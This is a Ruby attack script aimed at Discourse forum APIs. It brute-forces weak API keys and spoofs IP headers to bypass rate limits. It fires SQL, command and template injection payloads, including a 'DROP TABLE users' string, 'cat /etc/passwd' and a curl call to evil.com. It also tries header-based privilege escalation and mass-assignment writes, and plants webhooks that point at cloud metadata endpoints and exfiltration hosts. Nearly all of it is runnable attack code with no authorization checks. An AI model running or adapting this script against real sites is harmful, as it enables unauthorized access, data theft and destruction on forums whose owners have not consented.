#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'time'
require 'optparse'
require 'webrick'
require 'thread'

class DiscourseAPIExploits
  attr_accessor :api_key, :api_username
  
  def initialize(target_url, proxy = nil, timeout = 10)
    @target_url = target_url.chomp('/')
    @proxy = proxy
    @timeout = timeout
    @api_key = nil
    @api_username = nil
    
    # Setup HTTP client with proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      @http_class = Net::HTTP::Proxy(proxy_uri.host, proxy_uri.port)
    else
      @http_class = Net::HTTP
    end
  end
  
  def test_api_key_enumeration
    """
    Tests for API key enumeration vulnerabilities
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'enumerated_keys' => [],
      'weak_keys' => []
    }
    
    # Common weak API keys
    weak_keys = [
      'admin', 'administrator', 'root', 'test', 'guest',
      'api', 'key', 'secret', 'password', 'discourse',
      '123456', 'qwerty', 'abc123', 'admin123', 'test123',
      '00000000-0000-0000-0000-000000000000',
      'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
      '12345678-1234-1234-1234-123456789012'
    ]
    
    # Common usernames to test
    common_usernames = [
      'admin', 'administrator', 'root', 'system', 'discourse',
      'moderator', 'staff', 'user', 'guest', 'test'
    ]
    
    weak_keys.each do |key|
      common_usernames.each do |username|
        begin
          response = make_request(
            'GET',
            '/admin/users.json',
            nil,
            {
              'Api-Key' => key,
              'Api-Username' => username
            }
          )
          
          if check_api_access(response)
            results['vulnerable'] = true
            results['details'] << "Weak API key found: #{key} with username: #{username}"
            results['enumerated_keys'] << "#{key}:#{username}"
            results['weak_keys'] << key
          end
          
          sleep(0.2)
          
        rescue => e
          results['details'] << "Error testing API key #{key}: #{e.message}"
        end
      end
    end
    
    # Test for sequential API key generation
    base_keys = [
      '00000000-0000-0000-0000-00000000000',
      '11111111-1111-1111-1111-11111111111',
      'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa'
    ]
    
    base_keys.each do |base|
      (0..9).each do |i|
        test_key = base + i.to_s
        
        begin
          response = make_request(
            'GET',
            '/admin/users.json',
            nil,
            {
              'Api-Key' => test_key,
              'Api-Username' => 'admin'
            }
          )
          
          if check_api_access(response)
            results['vulnerable'] = true
            results['details'] << "Sequential API key found: #{test_key}"
            results['enumerated_keys'] << test_key
          end
          
          sleep(0.1)
          
        rescue => e
          results['details'] << "Error testing sequential key #{test_key}: #{e.message}"
        end
      end
    end
    
    results
  end
  
  def test_api_rate_limit_bypass
    """
    Tests for API rate limit bypass vulnerabilities
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'bypass_methods' => []
    }
    
    # Headers for rate limit bypass
    bypass_headers = [
      {'X-Forwarded-For' => '127.0.0.1'},
      {'X-Real-IP' => '192.168.1.1'},
      {'X-Originating-IP' => '10.0.0.1'},
      {'X-Remote-IP' => '172.16.0.1'},
      {'X-Client-IP' => '203.0.113.1'},
      {'CF-Connecting-IP' => '198.51.100.1'},
      {'True-Client-IP' => '192.0.2.1'},
      {'X-Cluster-Client-IP' => '127.0.0.1'},
      {'Fastly-Client-IP' => '10.0.0.1'},
      {'X-Azure-ClientIP' => '172.16.0.1'}
    ]
    
    # User-Agent rotation
    user_agents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
      'DiscourseBot/1.0',
      'curl/7.68.0',
      'PostmanRuntime/7.26.8'
    ]
    
    # Origin/Referer manipulation
    origin_headers = [
      {'Origin' => @target_url},
      {'Origin' => 'https://discourse.org'},
      {'Origin' => 'null'},
      {'Referer' => @target_url},
      {'Referer' => 'https://discourse.org'}
    ]
    
    test_endpoint = '/search.json?q=test'
    
    # Test normal rate limit
    normal_requests = 0
    10.times do
      begin
        response = make_request('GET', test_endpoint)
        if response.code.to_i == 200
          normal_requests += 1
        elsif response.code.to_i == 429
          break
        end
        sleep(0.1)
      rescue
        break
      end
    end
    
    # Test bypass methods
    bypass_headers.each_with_index do |headers, index|
      bypass_requests = 0
      
      10.times do
        begin
          combined_headers = headers.merge({
            'User-Agent' => user_agents[index % user_agents.length]
          })
          
          response = make_request('GET', test_endpoint, nil, combined_headers)
          if response.code.to_i == 200
            bypass_requests += 1
          elsif response.code.to_i == 429
            break
          end
          sleep(0.1)
        rescue
          break
        end
      end
      
      if bypass_requests > normal_requests
        results['vulnerable'] = true
        results['details'] << "Rate limit bypass with headers: #{headers}"
        results['bypass_methods'] << headers
      end
    end
    
    # Test origin/referer bypass
    origin_headers.each do |headers|
      bypass_requests = 0
      
      10.times do
        begin
          response = make_request('GET', test_endpoint, nil, headers)
          if response.code.to_i == 200
            bypass_requests += 1
          elsif response.code.to_i == 429
            break
          end
          sleep(0.1)
        rescue
          break
        end
      end
      
      if bypass_requests > normal_requests
        results['vulnerable'] = true
        results['details'] << "Rate limit bypass with origin/referer: #{headers}"
        results['bypass_methods'] << headers
      end
    end
    
    results
  end
  
  def test_api_injection_vulnerabilities
    """
    Tests for injection vulnerabilities in API endpoints
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'vulnerable_endpoints' => [],
      'injection_types' => []
    }
    
    # SQL injection payloads
    sql_payloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT 1,2,3,4,5 --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; WAITFOR DELAY '00:00:05' --",
      "' OR SLEEP(5) --",
      "' OR pg_sleep(5) --"
    ]
    
    # NoSQL injection payloads
    nosql_payloads = [
      "{'$ne': null}",
      "{'$gt': ''}",
      "{'$where': 'this.username == this.password'}",
      "{'$regex': '.*'}",
      "{'$exists': true}"
    ]
    
    # Command injection payloads
    cmd_payloads = [
      "; ls -la",
      "| whoami",
      "&& id",
      "; cat /etc/passwd",
      "| ping -c 1 127.0.0.1",
      "&& curl http://evil.com"
    ]
    
    # LDAP injection payloads
    ldap_payloads = [
      "*)(uid=*))(|(uid=*",
      "*)(|(password=*))",
      "*))%00",
      "*()|%26'",
      "*)(objectClass=*"
    ]
    
    # XPath injection payloads
    xpath_payloads = [
      "' or '1'='1",
      "' or 1=1 or ''='",
      "x' or name()='username' or 'x'='y",
      "' or position()=1 or ''='"
    ]
    
    # Template injection payloads
    template_payloads = [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "#{7*7}",
      "{{config}}",
      "${env}"
    ]
    
    # API endpoints to test
    test_endpoints = [
      '/users.json',
      '/search.json',
      '/topics.json',
      '/categories.json',
      '/admin/users.json',
      '/admin/reports.json'
    ]
    
    payload_sets = {
      'SQL' => sql_payloads,
      'NoSQL' => nosql_payloads,
      'Command' => cmd_payloads,
      'LDAP' => ldap_payloads,
      'XPath' => xpath_payloads,
      'Template' => template_payloads
    }
    
    payload_sets.each do |injection_type, payloads|
      payloads.each do |payload|
        test_endpoints.each do |endpoint|
          begin
            # Test in query parameters
            test_url = "#{endpoint}?q=#{URI.encode_www_form_component(payload)}"
            
            headers = {'Content-Type' => 'application/json'}
            if @api_key
              headers['Api-Key'] = @api_key
              headers['Api-Username'] = @api_username
            end
            
            response = make_request('GET', test_url, nil, headers)
            
            if check_injection_vulnerability(response, payload)
              results['vulnerable'] = true
              results['details'] << "#{injection_type} injection in #{endpoint}: #{payload}"
              results['vulnerable_endpoints'] << endpoint
              results['injection_types'] << injection_type
            end
            
            # Test in POST data
            if endpoint.include?('users') || endpoint.include?('topics')
              post_data = {
                'title' => payload,
                'content' => payload,
                'username' => payload,
                'email' => payload
              }
              
              response = make_request('POST', endpoint, post_data.to_json, headers)
              
              if check_injection_vulnerability(response, payload)
                results['vulnerable'] = true
                results['details'] << "#{injection_type} injection in POST #{endpoint}: #{payload}"
                results['vulnerable_endpoints'] << endpoint
                results['injection_types'] << injection_type
              end
            end
            
            sleep(0.3)
            
          rescue => e
            results['details'] << "Error testing #{injection_type} injection #{endpoint}: #{e.message}"
          end
        end
      end
    end
    
    results
  end
  
  def test_api_privilege_escalation
    """
    Tests for privilege escalation vulnerabilities
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'escalation_methods' => []
    }
    
    # Admin endpoints to test unauthorized access
    admin_endpoints = [
      '/admin/users.json',
      '/admin/dashboard.json',
      '/admin/reports.json',
      '/admin/logs.json',
      '/admin/api.json',
      '/admin/plugins.json',
      '/admin/site_settings.json'
    ]
    
    # Headers for privilege escalation
    escalation_headers = [
      {'X-Admin' => 'true'},
      {'X-Staff' => 'true'},
      {'X-Moderator' => 'true'},
      {'X-Trust-Level' => '4'},
      {'X-User-Role' => 'admin'},
      {'X-Privilege' => 'admin'},
      {'Admin' => '1'},
      {'Staff' => '1'},
      {'Is-Admin' => 'true'},
      {'Role' => 'administrator'}
    ]
    
    admin_endpoints.each do |endpoint|
      # Test without any authentication
      begin
        response = make_request('GET', endpoint)
        
        if check_unauthorized_access(response)
          results['vulnerable'] = true
          results['details'] << "Unauthorized admin access to #{endpoint}"
          results['escalation_methods'] << "No authentication required for #{endpoint}"
        end
        
        # Test with privilege escalation headers
        escalation_headers.each do |headers|
          response = make_request('GET', endpoint, nil, headers)
          
          if check_unauthorized_access(response)
            results['vulnerable'] = true
            results['details'] << "Privilege escalation via headers #{headers} on #{endpoint}"
            results['escalation_methods'] << headers
          end
          
          sleep(0.2)
        end
        
      rescue => e
        results['details'] << "Error testing privilege escalation #{endpoint}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_api_mass_assignment
    """
    Tests for mass assignment vulnerabilities
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'vulnerable_endpoints' => []
    }
    
    # Mass assignment payloads
    mass_assignment_payloads = [
      # User privilege escalation
      {
        'admin' => true,
        'moderator' => true,
        'staff' => true,
        'trust_level' => 4,
        'approved' => true,
        'active' => true
      },
      
      # System settings
      {
        'site_setting' => {
          'allow_user_registration' => false,
          'must_approve_users' => false,
          'enable_sso' => false
        }
      },
      
      # Database fields
      {
        'id' => 1,
        'created_at' => Time.now.iso8601,
        'updated_at' => Time.now.iso8601,
        'deleted_at' => nil
      }
    ]
    
    # Writable endpoints
    writable_endpoints = [
      '/users.json',
      '/topics.json',
      '/posts.json',
      '/categories.json',
      '/admin/users.json',
      '/admin/site_settings.json'
    ]
    
    mass_assignment_payloads.each do |payload|
      writable_endpoints.each do |endpoint|
        ['POST', 'PUT'].each do |method|
          begin
            headers = {'Content-Type' => 'application/json'}
            if @api_key
              headers['Api-Key'] = @api_key
              headers['Api-Username'] = @api_username
            end
            
            response = make_request(method, endpoint, payload.to_json, headers)
            
            if check_mass_assignment(response, payload)
              results['vulnerable'] = true
              results['details'] << "Mass assignment in #{endpoint}: #{payload}"
              results['vulnerable_endpoints'] << endpoint
            end
            
            sleep(0.3)
            
          rescue => e
            results['details'] << "Error testing mass assignment #{endpoint}: #{e.message}"
          end
        end
      end
    end
    
    results
  end
  
  def test_api_information_disclosure
    """
    Tests for information disclosure in API responses
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'disclosed_info' => []
    }
    
    # API endpoints that might disclose sensitive information
    info_endpoints = [
      '/site.json',
      '/about.json',
      '/users.json',
      '/admin/dashboard.json',
      '/admin/reports.json',
      '/admin/users.json',
      '/admin/api.json',
      '/admin/plugins.json',
      '/admin/site_settings.json',
      '/categories.json',
      '/latest.json',
      '/search.json?q=password',
      '/search.json?q=secret',
      '/search.json?q=api',
      '/search.json?q=admin'
    ]
    
    info_endpoints.each do |endpoint|
      begin
        # Test without authentication
        response = make_request('GET', endpoint)
        
        disclosed_info = extract_sensitive_info(response, endpoint)
        if !disclosed_info.empty?
          results['vulnerable'] = true
          results['details'].concat(disclosed_info)
          results['disclosed_info'].concat(disclosed_info)
        end
        
        # Test with various authentication attempts
        auth_attempts = [
          {'Api-Key' => 'guest', 'Api-Username' => 'guest'},
          {'Api-Key' => 'public', 'Api-Username' => 'public'},
          {'Authorization' => 'Bearer guest'},
          {'X-API-Key' => 'anonymous'}
        ]
        
        auth_attempts.each do |auth|
          response = make_request('GET', endpoint, nil, auth)
          
          disclosed_info = extract_sensitive_info(response, endpoint)
          if !disclosed_info.empty?
            results['vulnerable'] = true
            results['details'].concat(disclosed_info)
            results['disclosed_info'].concat(disclosed_info)
          end
        end
        
        sleep(0.2)
        
      rescue => e
        results['details'] << "Error testing info disclosure #{endpoint}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_api_webhook_exploits
    """
    Tests for webhook-related API vulnerabilities
    """
    results = {
      'vulnerable' => false,
      'details' => [],
      'webhook_exploits' => []
    }
    
    # Malicious webhook URLs
    malicious_webhooks = [
      # SSRF attempts
      'http://127.0.0.1:22',
      'http://localhost:3000',
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'file:///etc/passwd',
      'ftp://internal.server.com/',
      
      # External data exfiltration
      'https://evil.com/webhook',
      'https://requestbin.com/webhook',
      'https://webhook.site/unique-id',
      
      # Protocol confusion
      'javascript:alert("Webhook XSS")',
      'data:text/html,<script>alert("Webhook XSS")</script>',
      'vbscript:msgbox("Webhook VBS")',
      
      # DNS exfiltration
      'http://webhook-test.evil.com/',
      'https://dns-exfil.evil.com/'
    ]
    
    malicious_webhooks.each do |webhook_url|
      begin
        # Test webhook creation
        webhook_data = {
          'webhook' => {
            'payload_url' => webhook_url,
            'content_type' => 'application/json',
            'secret' => 'test_secret',
            'events' => ['post', 'topic']
          }
        }
        
        headers = {'Content-Type' => 'application/json'}
        if @api_key
          headers['Api-Key'] = @api_key
          headers['Api-Username'] = @api_username
        end
        
        response = make_request('POST', '/admin/api/web_hooks.json', webhook_data.to_json, headers)
        
        if check_webhook_creation(response, webhook_url)
          results['vulnerable'] = true
          results['details'] << "Malicious webhook created: #{webhook_url}"
          results['webhook_exploits'] << webhook_url
        end
        
        # Test webhook trigger
        trigger_data = {
          'title' => 'Test Webhook Trigger',
          'raw' => 'This should trigger the webhook',
          'category' => 1
        }
        
        response = make_request('POST', '/posts.json', trigger_data.to_json, headers)
        
        sleep(0.5)
        
      rescue => e
        results['details'] << "Error testing webhook #{webhook_url}: #{e.message}"
      end
    end
    
    results
  end
  
  private
  
  def make_request(method, path, data = nil, headers = {})
    uri = URI("#{@target_url}#{path}")
    
    http = @http_class.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              when 'PUT'
                Net::HTTP::Put.new(uri)
              when 'DELETE'
                Net::HTTP::Delete.new(uri)
              else
                raise "Unsupported HTTP method: #{method}"
              end
    
    headers.each { |key, value| request[key] = value }
    request.body = data if data
    
    http.request(request)
  end
  
  def check_api_access(response)
    """
    Checks if API access was successful
    """
    if response.code.to_i == 200
      begin
        data = JSON.parse(response.body)
        # Check for user data or admin data
        return (data.is_a?(Array) || data.is_a?(Hash)) && response.body.length > 50
      rescue
        return false
      end
    end
    false
  end
  
  def check_injection_vulnerability(response, payload)
    """
    Checks for injection vulnerability indicators
    """
    content = response.body.downcase
    
    # SQL injection indicators
    if ['drop', 'union', 'select'].any? { |indicator| payload.downcase.include?(indicator) }
      sql_errors = [
        'syntax error', 'mysql error', 'postgresql error',
        'ora-', 'sqlite error', 'column', 'table'
      ]
      return true if sql_errors.any? { |error| content.include?(error) }
    end
    
    # Command injection indicators
    if [';', '|', '&&'].any? { |indicator| payload.include?(indicator) }
      cmd_indicators = ['root:', 'uid=', 'gid=', '/bin/', '/usr/']
      return true if cmd_indicators.any? { |indicator| content.include?(indicator) }
    end
    
    # Template injection indicators
    if ['{{', '${', '<%='].any? { |indicator| payload.include?(indicator) }
      return true if content.include?('49') || content.include?('error')
    end
    
    false
  end
  
  def check_unauthorized_access(response)
    """
    Checks if unauthorized access was successful
    """
    if response.code.to_i == 200
      begin
        data = JSON.parse(response.body)
        # Check for admin-specific data
        admin_indicators = ['admin', 'users', 'reports', 'logs', 'settings']
        json_str = data.to_json.downcase
        return admin_indicators.any? { |indicator| json_str.include?(indicator) }
      rescue
        return false
      end
    end
    false
  end
  
  def check_mass_assignment(response, payload)
    """
    Checks if mass assignment was successful
    """
    if [200, 201].include?(response.code.to_i)
      begin
        data = JSON.parse(response.body)
        # Check if any of the mass-assigned fields are present in response
        return payload.keys.any? { |key| response.body.downcase.include?(key.to_s.downcase) }
      rescue
        # pass
      end
    end
    false
  end
  
  def extract_sensitive_info(response, endpoint)
    """
    Extracts sensitive information from API responses
    """
    disclosed_info = []
    
    if response.code.to_i == 200
      begin
        data = JSON.parse(response.body)
        json_str = data.to_json.downcase
        
        # Check for sensitive data patterns
        sensitive_patterns = [
          ['password', /password["']?\s*:\s*["']([^"',}]+)/],
          ['api_key', /api[_-]?key["']?\s*:\s*["']([^"',}]+)/],
          ['secret', /secret["']?\s*:\s*["']([^"',}]+)/],
          ['token', /token["']?\s*:\s*["']([^"',}]+)/],
          ['email', /email["']?\s*:\s*["']([^"',}]+@[^"',}]+)/],
          ['database', /database["']?\s*:\s*["']([^"',}]+)/],
          ['host', /host["']?\s*:\s*["']([^"',}]+)/]
        ]
        
        sensitive_patterns.each do |pattern_name, pattern|
          matches = json_str.scan(pattern)
          if !matches.empty?
            disclosed_info << "#{endpoint} disclosed #{pattern_name}: #{matches}"
          end
        end
        
        # Check for user enumeration
        if json_str.include?('users') && (data.is_a?(Array) || data.is_a?(Hash))
          if data.is_a?(Array) && data.length > 0
            disclosed_info << "#{endpoint} disclosed #{data.length} users"
          elsif data.is_a?(Hash) && data['users']
            user_count = data['users'].length
            if user_count > 0
              disclosed_info << "#{endpoint} disclosed #{user_count} users"
            end
          end
        end
        
        # Check for admin information
        admin_indicators = ['admin', 'moderator', 'staff', 'trust_level']
        if admin_indicators.any? { |indicator| json_str.include?(indicator) }
          disclosed_info << "#{endpoint} disclosed admin/staff information"
        end
        
      rescue
        # pass
      end
    end
    
    disclosed_info
  end
  
  def check_webhook_creation(response, webhook_url)
    """
    Checks if webhook creation was successful
    """
    if [200, 201].include?(response.code.to_i)
      begin
        data = JSON.parse(response.body)
        return data.key?('id') || data.key?('webhook') || response.body.downcase.include?('success')
      rescue
        content = response.body.downcase
        return content.include?('created') || content.include?('success')
      end
    end
    false
  end
  
  public
  
  def run_all_tests
    """
    Runs all API exploit tests
    """
    puts "[*] Starting API exploit tests on #{@target_url}"
    
    all_results = {
      'target' => @target_url,
      'timestamp' => Time.now.strftime('%Y-%m-%d %H:%M:%S'),
      'tests' => {}
    }
    
    tests = [
      ['API Key Enumeration', method(:test_api_key_enumeration)],
      ['API Rate Limit Bypass', method(:test_api_rate_limit_bypass)],
      ['API Injection Vulnerabilities', method(:test_api_injection_vulnerabilities)],
      ['API Privilege Escalation', method(:test_api_privilege_escalation)],
      ['API Mass Assignment', method(:test_api_mass_assignment)],
      ['API Information Disclosure', method(:test_api_information_disclosure)],
      ['API Webhook Exploits', method(:test_api_webhook_exploits)]
    ]
    
    tests.each do |test_name, test_func|
      puts "[*] Running #{test_name}..."
      begin
        result = test_func.call
        all_results['tests'][test_name] = result
        
        if result['vulnerable']
          puts "[!] VULNERABLE: #{test_name}"
          result['details'].each do |detail|
            puts "    - #{detail}"
          end
        else
          puts "[+] Not vulnerable: #{test_name}"
        end
        
      rescue => e
        puts "[!] Error in #{test_name}: #{e.message}"
        all_results['tests'][test_name] = {'error' => e.message}
      end
    end
    
    all_results
  end
end

def main
  options = {}
  
  OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options] target_url"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('--api-key KEY', 'API key for authenticated tests') do |key|
      options[:api_key] = key
    end
    
    opts.on('--api-username USERNAME', 'API username for authenticated tests') do |username|
      options[:api_username] = username
    end
    
    opts.on('-h', '--help', 'Show this help message') do
      puts opts
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL is required"
    puts "Usage: #{$0} [options] target_url"
    exit 1
  end
  
  target_url = ARGV[0]
  
  # Run API exploit tests
  api_tester = DiscourseAPIExploits.new(
    target_url,
    options[:proxy],
    options[:timeout] || 10
  )
  
  # Set API credentials if provided
  if options[:api_key]
    api_tester.api_key = options[:api_key]
    api_tester.api_username = options[:api_username] || 'system'
  end
  
  results = api_tester.run_all_tests
  
  # Print summary
  puts "\n" + "="*60
  puts "API EXPLOIT TEST SUMMARY"
  puts "="*60
  
  vulnerable_tests = []
  results['tests'].each do |test_name, result|
    if result['vulnerable']
      vulnerable_tests << test_name
    end
  end
  
  if !vulnerable_tests.empty?
    puts "[!] CRITICAL: #{vulnerable_tests.length} API vulnerabilities found!"
    vulnerable_tests.each do |test|
      puts "    - #{test}"
    end
    puts "\n[!] WARNING: API vulnerabilities can lead to complete system compromise!"
  else
    puts "[+] No API vulnerabilities detected"
  end
  
  puts "\n[*] Full results saved to discourse_api_exploits_results.json"
  
  # Save results to file
  File.write('discourse_api_exploits_results.json', JSON.pretty_generate(results))
end

if __FILE__ == $0
  main
end